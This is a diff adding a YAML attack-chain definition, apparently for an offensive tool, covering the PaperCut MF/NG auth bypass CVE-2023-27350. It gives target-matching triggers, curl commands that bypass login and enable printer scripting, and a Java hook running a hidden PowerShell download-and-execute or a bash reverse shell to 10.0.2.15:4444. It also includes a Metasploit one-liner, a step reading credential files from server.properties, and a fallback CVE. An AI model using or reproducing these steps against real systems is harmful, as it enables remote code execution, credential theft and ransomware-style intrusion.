@@ -1,0 +1,70 @@
+chain_id: papercut_cve_2023_27350
+title: "PaperCut MF/NG — CVE-2023-27350 auth bypass → SYSTEM RCE via scripting"
+severity: CRITICAL
+tags: [web, papercut, cve-2023-27350, auth-bypass, rce, ransomware]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-27350" }
+    - { banner_pattern: "(?i)papercut" }
+    - { product_pattern: "(?i)papercut\\s*(mf|ng)" }
+    - { path_pattern: "(?i)/app\\?service=page/SetupCompleted" }
+    - { port_in: [9191, 9192] }
+
+description: |
+  PaperCut MF/NG ≤ 22.0.4 (and < 21.2.10, < 20.1.10) lets an unauth
+  attacker hit `/app?service=page/SetupCompleted` to be auto-logged-in
+  as `admin`. From the admin UI you flip "Enable scripting" on a
+  printer and paste a Java script that executes commands as the
+  PaperCut service account (SYSTEM on Windows). Mass-exploited by Cl0p
+  and BlackBasta in 2023.
+
+steps:
+  - id: 1
+    title: "One-curl auth bypass — drops you on the admin dashboard"
+    command: |
+      curl -sk -c /tmp/pc.jar "http://$VICTIMA:9191/app?service=page/SetupCompleted"
+      curl -sk -b /tmp/pc.jar "http://$VICTIMA:9191/app?service=page/Dashboard"
+
+  - id: 2
+    title: "Enable scripting on a printer (form POST)"
+    command: |
+      curl -sk -b /tmp/pc.jar "http://$VICTIMA:9191/app" -d \
+        'service=direct/1/PrinterList/$Form&sp=S0&Form0=$TextField,$TextField,$TextField,$Hidden,$Hidden,$Hidden,$Hidden,$Hidden,$Hidden,$Hidden,$Hidden,$Hidden&%24Hidden0=%2Fappl%2Fcommon%2Fprinter%2Fadd%2FSetupForm&%24Submit0=Apply'
+
+  - id: 3
+    title: "Paste Java script that runs cmd / bash"
+    command: |
+      # In UI: Printers → <any printer> → Scripting → enable → paste:
+      function printerHookRunCmd() {
+        var rt = java.lang.Runtime.getRuntime();
+        rt.exec(["cmd.exe","/c","powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.15/p.ps1')\""]);
+        // Linux: ["/bin/sh","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"]
+      }
+
+  - id: 4
+    title: "Trigger by submitting a print job (or the public Metasploit module does this for you)"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/papercut_ng_auth_bypass; \
+        set RHOSTS $VICTIMA; set RPORT 9191; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Hashes — PaperCut DB user creds live on disk"
+    command: |
+      # Windows:
+      type "C:\\Program Files\\PaperCut MF\\server\\server.properties"
+      # Linux:
+      cat /home/papercut/server/server.properties
+
+common_errors:
+  - error: "/app?service=page/SetupCompleted returns 302 → /login"
+    solution: |
+      Patched (≥22.0.5 / 21.2.11 / 20.1.11). Fall back to
+      CVE-2023-27351 (auth bypass on `/api/health`-style endpoints,
+      info disclosure only).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-27350
+  - https://www.papercut.com/kb/Main/PO-1216-and-PO-1219
+  - https://www.horizon3.ai/attack-research/red-team/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/
